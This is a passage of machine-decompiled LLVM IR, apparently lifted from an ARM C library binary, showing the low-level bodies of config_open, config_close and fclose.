  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_155f4, { 1, 0 }
  uselistorder label %dec_label_pc_153c4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15554, { 1, 0 }
  uselistorder label %dec_label_pc_1552c, { 1, 0 }
  uselistorder label %dec_label_pc_15520, { 0, 2, 1 }
  uselistorder label %dec_label_pc_154e4, { 1, 0 }
  uselistorder label %dec_label_pc_15418, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1568c = icmp eq i32* %arg1, null
  br i1 %v2_1568c, label %dec_label_pc_156b4, label %dec_label_pc_15694

dec_label_pc_15694:                               ; preds = %entry
  %v2_15694 = load i32, i32* %arg1, align 4
  %v1_15698 = inttoptr i32 %v2_15694 to i16*
  %v2_15698 = call i32 @__GI_fclose(i16* %v1_15698)
  %v0_1569c = load i32, i32* @r4, align 4
  %v1_1569c = add i32 %v0_1569c, 20
  %v2_1569c = inttoptr i32 %v1_1569c to i32*
  %v3_1569c = load i32, i32* %v2_1569c, align 4
  %v2_156a0 = icmp eq i32 %v3_1569c, 0
  br i1 %v2_156a0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15694
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15694, %bb
  store i32 87724, i32* @lr, align 4
  %v1_156a8 = xor i1 %v2_156a0, true
  call void @__pseudo_cond_branch(i1 %v1_156a8, i32 ptrtoint (i32* @global_var_12d7c.33 to i32))
  %v0_156ac = load i32, i32* @r4, align 4
  store i32 %v0_156ac, i32* @r0, align 4
  %v0_156b0 = call i32 @free()
  br label %dec_label_pc_156b4

dec_label_pc_156b4:                               ; preds = %entry, %bb6
  %v1_156b8 = phi i32 [ 0, %entry ], [ %v0_156b0, %bb6 ]
  ret i32 %v1_156b8

; uselistorder directives
  uselistorder label %dec_label_pc_156b4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_156c8 = load i32, i32* @r4, align 4
  store i32 %v3_156c8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -33972), i32* @r1, align 4
  %v0_156d0 = call i32 @__GI_fopen()
  store i32 %v0_156d0, i32* %r0.global-to-local, align 4
  store i32 %v0_156d0, i32* @r4, align 4
  %v2_156d4 = icmp eq i32 %v0_156d0, 0
  br i1 %v2_156d4, label %bb, label %dec_label_pc_156e0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_156e0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_156e8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_156e8, i32* %r0.global-to-local, align 4
  %v2_156ec = icmp eq i32 %v2_156e8, 0
  br i1 %v2_156ec, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_156e0
  %v1_156f0 = load i32, i32* @r4, align 4
  %v3_156f0 = inttoptr i32 %v2_156e8 to i32*
  store i32 %v1_156f0, i32* %v3_156f0, align 4
  %v1_156f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_156e0, %bb4
  %v1_156f8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_156e0 ], [ %v1_156f8.pre, %bb4 ]
  %v2_156f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_156f4, i32* @r4, align 4
  ret i32 %v1_156f8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 40, 38, 39, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 0, 26, 25, 24, 23, 22, 2, 1, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15704 = load i32, i32* @r4, align 4
  store i32 %v3_15704, i32* %stack_var_-36, align 4
  %v6_15704 = load i32, i32* @r5, align 4
  %v9_15704 = load i32, i32* @r6, align 4
  %v12_15704 = load i32, i32* @r7, align 4
  %v2_15708 = add i32 %tmp, 52
  %v3_15708 = inttoptr i32 %v2_15708 to i32*
  %v4_15708 = load i32, i32* %v3_15708, align 4
  store i32 %v4_15708, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15710 = icmp eq i32 %v4_15708, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r8, align 4
  br i1 %v2_15710, label %dec_label_pc_15724, label %dec_label_pc_15788

dec_label_pc_15724:                               ; preds = %entry
  %v0_15724 = call i32 @__aeabi_read_tp()
  store i32 %v0_15724, i32* %r0.global-to-local, align 4
  %v0_15728 = load i32, i32* @r5, align 4
  %v1_15728 = add i32 %v0_15728, 64
  %v2_15728 = inttoptr i32 %v1_15728 to i32*
  %v3_15728 = load i32, i32* %v2_15728, align 4
  store i32 %v3_15728, i32* %r3.global-to-local, align 4
  %v1_1572c = add i32 %v0_15724, -1168
  store i32 %v1_1572c, i32* @r6, align 4
  %v3_15730 = icmp uge i32 %v3_15728, %v1_1572c
  store i1 %v3_15730, i1* %cpsr_c.global-to-local, align 1
  %v9_15730 = icmp eq i32 %v3_15728, %v1_1572c
  br i1 %v9_15730, label %dec_label_pc_1577c, label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %dec_label_pc_15724
  %v1_15738 = add i32 %v0_15728, 56
  store i32 %v1_15738, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15738, i32* %r2.global-to-local, align 4
  %v0_15744 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15744, i32* @r4, align 4
  %v1_15748115 = inttoptr i32 %v1_15738 to i32*
  %v2_15748116 = load i32, i32* %v1_15748115, align 4
  store i32 %v2_15748116, i32* %r3.global-to-local, align 4
  %v3_1574c118 = icmp uge i32 %v2_15748116, %v0_15744
  store i1 %v3_1574c118, i1* %cpsr_c.global-to-local, align 1
  %v9_1574c124 = icmp eq i32 %v2_15748116, %v0_15744
  br i1 %v9_1574c124, label %dec_label_pc_15754, label %dec_label_pc_1576c

dec_label_pc_15754:                               ; preds = %dec_label_pc_15738, %dec_label_pc_15754.dec_label_pc_15748_crit_edge
  %v0_15754125 = phi i32 [ %v1_1574c.pre, %dec_label_pc_15754.dec_label_pc_15748_crit_edge ], [ %v0_15744, %dec_label_pc_15738 ]
  store i32 %v0_15754125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15764 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15764, label %dec_label_pc_15768, label %dec_label_pc_15754.dec_label_pc_15748_crit_edge

dec_label_pc_15754.dec_label_pc_15748_crit_edge:  ; preds = %dec_label_pc_15754
  %v0_15748.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1574c.pre = load i32, i32* @r4, align 4
  %v1_15748 = inttoptr i32 %v0_15748.pre to i32*
  %v2_15748 = load i32, i32* %v1_15748, align 4
  store i32 %v2_15748, i32* %r3.global-to-local, align 4
  %v3_1574c = icmp uge i32 %v2_15748, %v1_1574c.pre
  store i1 %v3_1574c, i1* %cpsr_c.global-to-local, align 1
  %v9_1574c = icmp eq i32 %v2_15748, %v1_1574c.pre
  br i1 %v9_1574c, label %dec_label_pc_15754, label %dec_label_pc_1576c

dec_label_pc_15768:                               ; preds = %dec_label_pc_15754
  %v0_15768 = load i32, i32* @r4, align 4
  store i32 %v0_15768, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1576c

dec_label_pc_1576c:                               ; preds = %dec_label_pc_15738, %dec_label_pc_15754.dec_label_pc_15748_crit_edge, %dec_label_pc_15768
  %v0_1576c = phi i32 [ %v0_15768, %dec_label_pc_15768 ], [ %v2_15748116, %dec_label_pc_15738 ], [ %v2_15748, %dec_label_pc_15754.dec_label_pc_15748_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1576c = icmp eq i32 %v0_1576c, 0
  br i1 %v2_1576c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1576c
  %v1_15770 = load i32, i32* @r7, align 4
  store i32 %v1_15770, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1576c, %bb
  %v1_15774 = xor i1 %v2_1576c, true
  call void @__pseudo_cond_branch(i1 %v1_15774, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_15778 = load i32, i32* @r6, align 4
  %v1_15778 = load i32, i32* @r5, align 4
  %v2_15778 = add i32 %v1_15778, 64
  %v3_15778 = inttoptr i32 %v2_15778 to i32*
  store i32 %v0_15778, i32* %v3_15778, align 4
  %v0_1577c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1577c

dec_label_pc_1577c:                               ; preds = %dec_label_pc_15724, %bb41
  %v0_1577c = phi i32 [ %v0_15728, %dec_label_pc_15724 ], [ %v0_1577c.pre, %bb41 ]
  %v1_1577c = add i32 %v0_1577c, 60
  %v2_1577c = inttoptr i32 %v1_1577c to i32*
  %v3_1577c = load i32, i32* %v2_1577c, align 4
  %v1_15780 = add i32 %v3_1577c, 1
  store i32 %v1_15780, i32* %r3.global-to-local, align 4
  store i32 %v1_15780, i32* %v2_1577c, align 4
  %v0_15788.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %entry, %dec_label_pc_1577c
  %v1_15790 = phi i32 [ %tmp, %entry ], [ %v0_15788.pre, %dec_label_pc_1577c ]
  %v1_15788 = inttoptr i32 %v1_15790 to i16*
  %v2_15788 = load i16, i16* %v1_15788, align 2
  %v3_15788 = zext i16 %v2_15788 to i32
  store i32 %v3_15788, i32* %r3.global-to-local, align 4
  %v1_1578c = and i32 %v3_15788, 64
  %v2_1578c = icmp eq i32 %v1_1578c, 0
  br i1 %v2_1578c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15788
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15788, %bb42
  %storemerge = phi i32 [ %v1_15790, %bb42 ], [ %v1_1578c, %dec_label_pc_15788 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 87960, i32* @lr, align 4
  %v1_15794 = xor i1 %v2_1578c, true
  call void @__pseudo_cond_branch(i1 %v1_15794, i32 ptrtoint (i32* @global_var_165d8.604 to i32))
  %v0_15798 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15798, i32* %fp.global-to-local, align 4
  %v0_1579c = load i32, i32* @r5, align 4
  %v1_1579c = add i32 %v0_1579c, 4
  %v2_1579c = inttoptr i32 %v1_1579c to i32*
  %v3_1579c = load i32, i32* %v2_1579c, align 4
  store i32 %v3_1579c, i32* %r0.global-to-local, align 4
  %v1_157a0 = call i32 @__GI___libc_close(i32 %v3_1579c)
  store i32 %v1_157a0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_157a8 = load i32, i32* @r8, align 4
  %v2_157a8 = add i32 %v0_157a8, 160
  %v3_157a8 = inttoptr i32 %v2_157a8 to i32*
  %v4_157a8 = load i32, i32* %v3_157a8, align 4
  store i32 %v4_157a8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_157ac = icmp slt i32 %v1_157a0, 0
  br i1 %v1_157ac, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_157b4 = add i32 %v4_157a8, 8
  %v2_157b4 = inttoptr i32 %v1_157b4 to i32*
  %v3_157b4 = load i32, i32* %v2_157b4, align 4
  store i32 %v3_157b4, i32* %r3.global-to-local, align 4
  %v0_157b8 = call i32 @__aeabi_read_tp()
  store i32 %v0_157b8, i32* %r0.global-to-local, align 4
  %v1_157bc = add i32 %v0_157b8, -1168
  store i32 %v1_157bc, i32* %sl.global-to-local, align 4
  %v0_157c0 = load i32, i32* %r3.global-to-local, align 4
  %v3_157c0 = icmp uge i32 %v0_157c0, %v1_157bc
  store i1 %v3_157c0, i1* %cpsr_c.global-to-local, align 1
  %v9_157c0 = icmp eq i32 %v0_157c0, %v1_157bc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_157c8 = load i32, i32* @r5, align 4
  %v2_157c8 = add i32 %v1_157c8, 4
  %v3_157c8 = inttoptr i32 %v2_157c8 to i32*
  store i32 -1, i32* %v3_157c8, align 4
  br i1 %v9_157c0, label %dec_label_pc_15810, label %dec_label_pc_157d0

dec_label_pc_157d0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_157d4 = load i32, i32* @r7, align 4
  store i32 %v0_157d4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_157dc108 = inttoptr i32 %v0_157d4 to i32*
  %v2_157dc109 = load i32, i32* %v1_157dc108, align 4
  store i32 %v2_157dc109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_157e0111 = icmp eq i32 %v2_157dc109, 0
  br i1 %v9_157e0111, label %dec_label_pc_157e8, label %dec_label_pc_15800

dec_label_pc_157e8:                               ; preds = %dec_label_pc_157d0, %dec_label_pc_157e8.dec_label_pc_157dc_crit_edge
  %v0_157e8112 = phi i32 [ %v1_157e0.pre, %dec_label_pc_157e8.dec_label_pc_157dc_crit_edge ], [ 0, %dec_label_pc_157d0 ]
  store i32 %v0_157e8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_157f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_157f8, label %dec_label_pc_157fc, label %dec_label_pc_157e8.dec_label_pc_157dc_crit_edge

dec_label_pc_157e8.dec_label_pc_157dc_crit_edge:  ; preds = %dec_label_pc_157e8
  %v0_157dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_157e0.pre = load i32, i32* @r4, align 4
  %v1_157dc = inttoptr i32 %v0_157dc.pre to i32*
  %v2_157dc = load i32, i32* %v1_157dc, align 4
  store i32 %v2_157dc, i32* %r3.global-to-local, align 4
  %v3_157e0 = icmp uge i32 %v2_157dc, %v1_157e0.pre
  store i1 %v3_157e0, i1* %cpsr_c.global-to-local, align 1
  %v9_157e0 = icmp eq i32 %v2_157dc, %v1_157e0.pre
  br i1 %v9_157e0, label %dec_label_pc_157e8, label %dec_label_pc_15800

dec_label_pc_157fc:                               ; preds = %dec_label_pc_157e8
  %v0_157fc = load i32, i32* @r4, align 4
  store i32 %v0_157fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15800

dec_label_pc_15800:                               ; preds = %dec_label_pc_157d0, %dec_label_pc_157e8.dec_label_pc_157dc_crit_edge, %dec_label_pc_157fc
  %v0_15800 = phi i32 [ %v0_157fc, %dec_label_pc_157fc ], [ %v2_157dc109, %dec_label_pc_157d0 ], [ %v2_157dc, %dec_label_pc_157e8.dec_label_pc_157dc_crit_edge ]
  %v1_15800 = phi i32 [ %v0_157fc, %dec_label_pc_157fc ], [ 0, %dec_label_pc_157d0 ], [ %v1_157e0.pre, %dec_label_pc_157e8.dec_label_pc_157dc_crit_edge ]
  %v3_15800 = icmp uge i32 %v0_15800, %v1_15800
  store i1 %v3_15800, i1* %cpsr_c.global-to-local, align 1
  %v9_15800 = icmp eq i32 %v0_15800, %v1_15800
  br i1 %v9_15800, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_15800
  %v1_15804 = load i32, i32* @r7, align 4
  store i32 %v1_15804, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_15800, %bb46
  %v1_15808 = xor i1 %v9_15800, true
  call void @__pseudo_cond_branch(i1 %v1_15808, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_1580c = load i32, i32* %sl.global-to-local, align 4
  %v1_1580c = load i32, i32* @r7, align 4
  %v2_1580c = add i32 %v1_1580c, 8
  %v3_1580c = inttoptr i32 %v2_1580c to i32*
  store i32 %v0_1580c, i32* %v3_1580c, align 4
  br label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15814 = load i32, i32* @r8, align 4
  %v2_15814 = add i32 %v0_15814, 160
  %v3_15814 = inttoptr i32 %v2_15814 to i32*
  %v4_15814 = load i32, i32* %v3_15814, align 4
  store i32 %v4_15814, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1581c = add i32 %v0_15814, 12
  %v3_1581c = inttoptr i32 %v2_1581c to i32*
  %v4_1581c = load i32, i32* %v3_1581c, align 4
  store i32 %v4_1581c, i32* %r2.global-to-local, align 4
  %v1_15820 = add i32 %v4_15814, 4
  %v2_15820 = inttoptr i32 %v1_15820 to i32*
  %v3_15820 = load i32, i32* %v2_15820, align 4
  store i32 %v3_15820, i32* %r1.global-to-local, align 4
  %v1_15824 = inttoptr i32 %v4_1581c to i32*
  %v2_15824 = load i32, i32* %v1_15824, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15828 = icmp eq i32 %v3_15820, 0
  %v1_1582c = add i32 %v2_15824, 1
  store i32 %v1_1582c, i32* %r3.global-to-local, align 4
  store i32 %v1_1582c, i32* %v1_15824, align 4
  br i1 %v2_15828, label %dec_label_pc_15838, label %dec_label_pc_15898

dec_label_pc_15838:                               ; preds = %dec_label_pc_15810
  %v0_15838 = load i32, i32* %r1.global-to-local, align 4
  %v1_15838 = load i32, i32* %r0.global-to-local, align 4
  %v2_15838 = add i32 %v1_15838, 8
  %v3_15838 = inttoptr i32 %v2_15838 to i32*
  store i32 %v0_15838, i32* %v3_15838, align 4
  %v0_1583c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1583c, i32* @r7, align 4
  br label %dec_label_pc_15840

dec_label_pc_15840:                               ; preds = %dec_label_pc_15870.dec_label_pc_15840_crit_edge, %dec_label_pc_15838
  %v0_15840 = phi i32 [ %v0_15840.pre, %dec_label_pc_15870.dec_label_pc_15840_crit_edge ], [ %v0_1583c, %dec_label_pc_15838 ]
  %v1_15840 = inttoptr i32 %v0_15840 to i32*
  %v2_15840 = load i32, i32* %v1_15840, align 4
  store i32 %v2_15840, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15840, i32* %r2.global-to-local, align 4
  %v2_1584c96 = load i32, i32* %v1_15840, align 4
  store i32 %v2_1584c96, i32* %r3.global-to-local, align 4
  %v3_1585098 = icmp uge i32 %v2_1584c96, %v2_15840
  store i1 %v3_1585098, i1* %cpsr_c.global-to-local, align 1
  %v9_15850104 = icmp eq i32 %v2_1584c96, %v2_15840
  br i1 %v9_15850104, label %dec_label_pc_15858, label %dec_label_pc_15870

dec_label_pc_15858:                               ; preds = %dec_label_pc_15840, %dec_label_pc_15858.dec_label_pc_1584c_crit_edge
  %v0_15858105 = phi i32 [ %v1_15850.pre, %dec_label_pc_15858.dec_label_pc_1584c_crit_edge ], [ %v2_15840, %dec_label_pc_15840 ]
  store i32 %v0_15858105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15868 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15868, label %dec_label_pc_1586c, label %dec_label_pc_15858.dec_label_pc_1584c_crit_edge

dec_label_pc_15858.dec_label_pc_1584c_crit_edge:  ; preds = %dec_label_pc_15858
  %v0_1584c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15850.pre = load i32, i32* @r4, align 4
  %v1_1584c = inttoptr i32 %v0_1584c.pre to i32*
  %v2_1584c = load i32, i32* %v1_1584c, align 4
  store i32 %v2_1584c, i32* %r3.global-to-local, align 4
  %v3_15850 = icmp uge i32 %v2_1584c, %v1_15850.pre
  store i1 %v3_15850, i1* %cpsr_c.global-to-local, align 1
  %v9_15850 = icmp eq i32 %v2_1584c, %v1_15850.pre
  br i1 %v9_15850, label %dec_label_pc_15858, label %dec_label_pc_15870

dec_label_pc_1586c:                               ; preds = %dec_label_pc_15858
  %v0_1586c = load i32, i32* @r4, align 4
  store i32 %v0_1586c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15870

dec_label_pc_15870:                               ; preds = %dec_label_pc_15840, %dec_label_pc_15858.dec_label_pc_1584c_crit_edge, %dec_label_pc_1586c
  %v0_15878 = phi i32 [ %v0_1586c, %dec_label_pc_1586c ], [ %v2_1584c96, %dec_label_pc_15840 ], [ %v2_1584c, %dec_label_pc_15858.dec_label_pc_1584c_crit_edge ]
  %v1_15870 = phi i32 [ %v0_1586c, %dec_label_pc_1586c ], [ %v2_15840, %dec_label_pc_15840 ], [ %v1_15850.pre, %dec_label_pc_15858.dec_label_pc_1584c_crit_edge ]
  %v3_15870 = icmp uge i32 %v0_15878, %v1_15870
  store i1 %v3_15870, i1* %cpsr_c.global-to-local, align 1
  %v9_15870 = icmp eq i32 %v0_15878, %v1_15870
  br i1 %v9_15870, label %dec_label_pc_15878, label %dec_label_pc_15870.dec_label_pc_15840_crit_edge

dec_label_pc_15870.dec_label_pc_15840_crit_edge:  ; preds = %dec_label_pc_15870
  %v0_15840.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15840

dec_label_pc_15878:                               ; preds = %dec_label_pc_15870
  %v2_15878 = icmp ne i32 %v1_15870, 0
  store i1 %v2_15878, i1* %cpsr_c.global-to-local, align 1
  %v7_1587c = icmp slt i32 %v1_15870, 2
  br i1 %v7_1587c, label %dec_label_pc_15898, label %dec_label_pc_15880

dec_label_pc_15880:                               ; preds = %dec_label_pc_15878
  %v0_15880 = load i32, i32* @r7, align 4
  store i32 %v0_15880, i32* %r0.global-to-local, align 4
  %v0_15884 = load i32, i32* %r1.global-to-local, align 4
  %v1_15884 = add i32 %v0_15884, 129
  store i32 %v1_15884, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15898

dec_label_pc_15898:                               ; preds = %dec_label_pc_15810, %dec_label_pc_15880, %dec_label_pc_15878
  %v0_15898 = load i32, i32* @r5, align 4
  %v1_15898 = inttoptr i32 %v0_15898 to i16*
  %v2_15898 = load i16, i16* %v1_15898, align 2
  %v3_15898 = zext i16 %v2_15898 to i32
  %v1_1589c = and i32 %v3_15898, 24576
  %v1_158a0 = or i32 %v1_1589c, 48
  store i32 %v1_158a0, i32* %r3.global-to-local, align 4
  %v0_158a4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_158a4 = icmp eq i32 %v0_158a4, 0
  %v1_158a8 = trunc i32 %v1_158a0 to i16
  store i16 %v1_158a8, i16* %v1_15898, align 2
  br i1 %v2_158a4, label %dec_label_pc_158b0, label %dec_label_pc_15924

dec_label_pc_158b0:                               ; preds = %dec_label_pc_15898
  %v0_158b0 = load i32, i32* @r5, align 4
  %v1_158b0 = add i32 %v0_158b0, 60
  %v2_158b0 = inttoptr i32 %v1_158b0 to i32*
  %v3_158b0 = load i32, i32* %v2_158b0, align 4
  %v1_158b4 = add i32 %v3_158b0, -1
  store i32 %v1_158b4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_158b8 = icmp eq i32 %v1_158b4, 0
  store i32 %v1_158b4, i32* %v2_158b0, align 4
  br i1 %v2_158b8, label %dec_label_pc_158c4, label %dec_label_pc_15924

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158b0
  %v0_158c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_158c4 = load i32, i32* @r5, align 4
  %v2_158c4 = add i32 %v1_158c4, 64
  %v3_158c4 = inttoptr i32 %v2_158c4 to i32*
  store i32 %v0_158c4, i32* %v3_158c4, align 4
  %v0_158c8 = load i32, i32* @r5, align 4
  %v1_158c8 = add i32 %v0_158c8, 56
  store i32 %v1_158c8, i32* @r6, align 4
  br label %dec_label_pc_158cc

dec_label_pc_158cc:                               ; preds = %dec_label_pc_158fc.dec_label_pc_158cc_crit_edge, %dec_label_pc_158c4
  %v0_158d4 = phi i32 [ %v0_158d4.pre, %dec_label_pc_158fc.dec_label_pc_158cc_crit_edge ], [ %v1_158c8, %dec_label_pc_158c4 ]
  %v0_158cc = phi i32 [ %v0_158cc.pre, %dec_label_pc_158fc.dec_label_pc_158cc_crit_edge ], [ %v0_158c8, %dec_label_pc_158c4 ]
  %v1_158cc = add i32 %v0_158cc, 56
  %v2_158cc = inttoptr i32 %v1_158cc to i32*
  %v3_158cc = load i32, i32* %v2_158cc, align 4
  store i32 %v3_158cc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_158d4, i32* %r2.global-to-local, align 4
  %v1_158d882 = inttoptr i32 %v0_158d4 to i32*
  %v2_158d883 = load i32, i32* %v1_158d882, align 4
  store i32 %v2_158d883, i32* %r3.global-to-local, align 4
  %v3_158dc85 = icmp uge i32 %v2_158d883, %v3_158cc
  store i1 %v3_158dc85, i1* %cpsr_c.global-to-local, align 1
  %v9_158dc91 = icmp eq i32 %v2_158d883, %v3_158cc
  br i1 %v9_158dc91, label %dec_label_pc_158e4, label %dec_label_pc_158fc

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158cc, %dec_label_pc_158e4.dec_label_pc_158d8_crit_edge
  %v0_158e492 = phi i32 [ %v1_158dc.pre, %dec_label_pc_158e4.dec_label_pc_158d8_crit_edge ], [ %v3_158cc, %dec_label_pc_158cc ]
  store i32 %v0_158e492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_158f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_158f4, label %dec_label_pc_158f8, label %dec_label_pc_158e4.dec_label_pc_158d8_crit_edge

dec_label_pc_158e4.dec_label_pc_158d8_crit_edge:  ; preds = %dec_label_pc_158e4
  %v0_158d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_158dc.pre = load i32, i32* @r4, align 4
  %v1_158d8 = inttoptr i32 %v0_158d8.pre to i32*
  %v2_158d8 = load i32, i32* %v1_158d8, align 4
  store i32 %v2_158d8, i32* %r3.global-to-local, align 4
  %v3_158dc = icmp uge i32 %v2_158d8, %v1_158dc.pre
  store i1 %v3_158dc, i1* %cpsr_c.global-to-local, align 1
  %v9_158dc = icmp eq i32 %v2_158d8, %v1_158dc.pre
  br i1 %v9_158dc, label %dec_label_pc_158e4, label %dec_label_pc_158fc

dec_label_pc_158f8:                               ; preds = %dec_label_pc_158e4
  %v0_158f8 = load i32, i32* @r4, align 4
  store i32 %v0_158f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_158fc

dec_label_pc_158fc:                               ; preds = %dec_label_pc_158cc, %dec_label_pc_158e4.dec_label_pc_158d8_crit_edge, %dec_label_pc_158f8
  %v0_15904 = phi i32 [ %v0_158f8, %dec_label_pc_158f8 ], [ %v2_158d883, %dec_label_pc_158cc ], [ %v2_158d8, %dec_label_pc_158e4.dec_label_pc_158d8_crit_edge ]
  %v1_158fc = phi i32 [ %v0_158f8, %dec_label_pc_158f8 ], [ %v3_158cc, %dec_label_pc_158cc ], [ %v1_158dc.pre, %dec_label_pc_158e4.dec_label_pc_158d8_crit_edge ]
  %v3_158fc = icmp uge i32 %v0_15904, %v1_158fc
  store i1 %v3_158fc, i1* %cpsr_c.global-to-local, align 1
  %v9_158fc = icmp eq i32 %v0_15904, %v1_158fc
  br i1 %v9_158fc, label %dec_label_pc_15904, label %dec_label_pc_158fc.dec_label_pc_158cc_crit_edge

dec_label_pc_158fc.dec_label_pc_158cc_crit_edge:  ; preds = %dec_label_pc_158fc
  %v0_158cc.pre = load i32, i32* @r5, align 4
  %v0_158d4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_158cc

dec_label_pc_15904:                               ; preds = %dec_label_pc_158fc
  %v2_15904 = icmp ne i32 %v1_158fc, 0
  store i1 %v2_15904, i1* %cpsr_c.global-to-local, align 1
  %v7_15908 = icmp slt i32 %v1_158fc, 2
  br i1 %v7_15908, label %dec_label_pc_15924, label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %dec_label_pc_15904
  %v0_1590c = load i32, i32* @r5, align 4
  %v1_1590c = add i32 %v0_1590c, 56
  store i32 %v1_1590c, i32* %r0.global-to-local, align 4
  %v0_15910 = load i32, i32* %r1.global-to-local, align 4
